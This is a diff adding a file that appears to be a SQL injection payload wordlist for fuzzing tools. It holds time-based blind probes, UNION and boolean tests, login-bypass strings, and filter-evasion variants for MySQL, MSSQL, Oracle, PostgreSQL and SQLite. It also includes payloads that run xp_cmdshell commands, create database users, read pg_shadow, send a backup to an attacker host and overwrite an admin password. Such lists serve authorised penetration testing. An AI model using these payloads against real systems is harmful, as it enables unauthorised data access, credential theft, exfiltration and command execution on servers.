@@ -1,0 +1,181 @@
+!URL
+sleep(__TIME__)#
+1 or sleep(__TIME__)#
+" or sleep(__TIME__)#
+;waitfor delay '0:0:__TIME__'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+OR 1=1
+OR 1=0
+OR x=x
+OR x=y
+OR 1=1#
+OR 1=1-- 
+OR 1=0-- 
+OR x=x-- 
+OR x=y-- 
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+OR 3409=3409 AND ('pytW' LIKE 'pytY
+HAVING 1=1
+HAVING 1=0
+HAVING 1=1#
+HAVING 1=0#
+HAVING 1=1-- 
+HAVING 1=0-- 
+AND 1=1
+AND 1=0
+AND 1=1-- 
+AND 1=1#
+AND 1083=1083 AND (1427=1427
+AND 7506=9091 AND (5913=5913
+AND 1083=1083 AND ('1427=1427
+AND 7506=9091 AND ('5913=5913
+AND 7300=7300 AND 'pKlZ'='pKlZ
+AS INJECTX WHERE 1=1 AND 1=1
+WHERE 1=1 AND 1=1
+WHERE 1=1 AND 1=0
+WHERE 1=1 AND 1=1#
+WHERE 1=1 AND 1=0#
+WHERE 1=1 AND 1=1--
+WHERE 1=1 AND 1=0--
+ORDER BY 27-- 
+ORDER BY 31337--
+ORDER BY 31337#
+ORDER BY 1 
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+and (select substring(@@version,1,1))='X'
+'))) waitfor delay '0:0:20' --
+' union (select @@version) --
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'create user name identified by 'pass123' --
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+select @@version
+select @@servernamee
+select @@microsoftversione
+select * from master..sysserverse
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--
+exec master..xp_cmdshell 'ipconfig+/all'	
+1 and 1=1
+1' or '1'='1
+1 or 1=1
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+' or '1'='1
+'||utl_http.request('httP://192.168.1.1/')||'
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+select version();	
+select current_database();
+select current_user;
+select session_user;
+select current_setting('log_connections');
+select current_setting('log_statement');
+select current_setting('port');
+select current_setting('password_encryption');
+select current_setting('krb_server_keyfile');
+select current_setting('virtual_host');
+select current_setting('port');
+select current_setting('config_file');
+select current_setting('hba_file');
+select current_setting('data_directory');
+select * from pg_shadow;
+select * from pg_group;
+select * from myfile;copy myfile to /tmp/test;
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+RANDOMBLOB(500000000/2)
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+UNION ALL SELECT 1,2
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
+-1 UNION SELECT 1 INTO @,@
+' OR 'x'='x
+1' ORDER BY 1--+
+' or "
+' OR '1
+" OR "" = "
+' OR '' = '
+'='
+ OR 1=1
+' OR 'x'='x
+)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+ and 1=1
+' and 'one'='one
+' group by password having 1=1--
+' group by userid having 1=1--
+or 1=1
+") or "1"="1
+' and substring(password/text(),1,1)='7
+' or user like '%
+' or ''='
+select @@innodb_version;
+information_schema.tables
+mysql.innodb_table_stats
+SELECT	0x7461626c655f6e616d65	FROM	all_tab_tables
+SELECT	CHR(116)	||	CHR(97)	||	CHR(98)	FROM	all_tab_tables
+SELECT%00table_name%00FROM%00all_tab_tables
+.1UNION	SELECT	2	
+1.UNION	SELECT.2alias	
+1e0UNION	SELECT	2	
+1e1AND-1=0.0UNION	SELECT	2	
+SELECT	0xUNION	SELECT	2	
+SELECT\UNION	SELECT	2	
+\1UNION	SELECT	2	
+SELECT"table_name"FROM[information_schema].[tables]	
+1.UNION	SELECT	2	
+3.2UNION	SELECT	2	
+1e0UNION	SELECT	2	
+SELECT\N/0.e3UNION	SELECT	2	
+1e1AND-0.0UNION	SELECT	2	
+{ts	1}UNION	SELECT.``	1.e.table_name	
+SELECT	$.``	1.e.table_name	
+SELECT{_	.``1.e.table_name}	
+SELECT	LightOS	.	``1.e.table_name	LightOS	
+SELECT	information_schema 1337.e.tables	13.37e.table_name	
+SELECT	1	from	information_schema 9.e.table_name
+conv('a',16,2)=conv('a',16,2)
+connection_id()=connection_id()
+crc32('MySQL')=crc32('MySQL')
+BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
+@@CONNECTIONS>0
+@@CONNECTIONS=@@CONNECTIONS
+@@CPU_BUSY=@@CPU_BUSY
+USER_ID(1)=USER_ID(1)
+RAWTOHEX('AB')=RAWTOHEX('AB')
+pg_client_encoding()=pg_client_encoding()
+5::int=5
+5::integer=5
+get_current_ts_config()=get_current_ts_config()
+quote_literal(42.5)=quote_literal(42.5)
+current_database()=current_database()
+sqlite_version()=sqlite_version()
+last_insert_rowid()>1
+last_insert_rowid()=last_insert_rowid()
+val(cvar(1))=1
+cdbl(1)=cdbl(1)
+'i'='i'
+sha1("3fDf ", true) = ...
+union/*test*/select
+1%09and%091=1%09--
+union%09select
+INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");
